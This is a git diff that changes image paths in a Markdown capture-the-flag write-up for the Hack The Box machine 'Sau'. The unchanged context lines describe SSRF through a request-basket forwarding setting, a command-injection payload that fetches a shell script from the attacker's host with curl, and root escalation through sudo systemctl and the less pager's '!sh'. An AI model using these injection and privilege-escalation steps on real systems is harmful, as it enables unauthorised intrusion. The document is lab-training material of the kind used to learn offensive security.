@@ -1,6 +1,6 @@
 # Sau(HTB)
 
-![Untitled](Sau(HTB)/assets/images/sau/0.png)
+![Untitled](/assets/images/sau/0.png)
 
 # NMAP
 
@@ -55,13 +55,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Looking at the NMAP results we see that 3 ports are open. Port 22, 80 and 55555 are all open. However, port 80 is filtered meaning that the port is open but it is inaccessible externally. My first guess when I saw that filtered port in the NMAP result was that we would most likely have to find a SSRF (Server-Side Request Forgery) to elicit requests to port 80.  With that in mind I went to check out the web server that is running on port 55555.
 
-![Untitled](Sau(HTB)/assets/images/sau/1.png)
+![Untitled](/assets/images/sau/1.png)
 
 Visiting port 55555 brings us to this webpage. From looking at the page we learn that this webpage is just a simple HTTP request bin that collects and intercepts HTTP requests. 
 
 Lets Create a basket and test out the website!
 
-![Untitled](Sau(HTB)/assets/images/sau/2.png)
+![Untitled](/assets/images/sau/2.png)
 
 If we now send a curl request to the URL of our basket
 
@@ -71,23 +71,23 @@ curl http://10.10.11.224:5555/utslgxu
 
 we get a record of our request.
 
-![Untitled](Sau(HTB)/assets/images/sau/3.png)
+![Untitled](/assets/images/sau/3.png)
 
 # USER
 
 Looking at the settings for my basket we find a very promising settings that could potentially lead to SSRF.
 
-![Untitled](Sau(HTB)/assets/images/sau/4.png)
+![Untitled](/assets/images/sau/4.png)
 
 The **`Forward URL`** configuration allows the user to forward the http request to another URL and by enabling the **`Proxy Response`** we could look at the response of the request that has been forwarded to another URL. From what we’ve seen, this feature basically works like a VPN for us. 
 
 We configure the basket to forward our request to `**[http://127.0.0.1:80](http://127.0.0.1:80)`** and show us the response.
 
-![Untitled](Sau(HTB)/assets/images/sau/5.png)
+![Untitled](/assets/images/sau/5.png)
 
 Now let’s try to hit the port 80 that we couldn’t previously access. 
 
-![Untitled](Sau(HTB)/assets/images/sau/6.png)
+![Untitled](/assets/images/sau/6.png)
 
 We get greeted by the web page that is running on port 80. 
 
@@ -112,14 +112,14 @@ curl http://10.10.11.224/utslgxu --data 'username=;`curl 10.10.14.123:8000/shell
 
 Now that we are on the box as the user puma, we can do our usual privilege escalation enumeration. Starting with `**sudo -l**`
 
-![Untitled](Sau(HTB)/assets/images/sau/7.png)
+![Untitled](/assets/images/sau/7.png)
 
 We can see that we can run systemctl with sudo. A quick GTFO bin search will show a way to exploit this.
 
 > [https://gtfobins.github.io/](https://gtfobins.github.io/)
 > 
 
-![Untitled](Sau(HTB)/assets/images/sau/8.png)
+![Untitled](/assets/images/sau/8.png)
 
 Basically when `**systemctl**` is ran with sudo the default pager `**less`** will be ran with sudo privileges as well. 
 
@@ -128,4 +128,4 @@ Basically when `**systemctl**` is ran with sudo the default pager `**less`** wil
 
 And when we get put into the pager in this case it is `**less` . W**e can spawn a shell with the `**!sh**` command when we are in the less pager, giving us a shell as the root user!
 
-![Untitled](Sau(HTB)/assets/images/sau/9.png)
+![Untitled](/assets/images/sau/9.png)
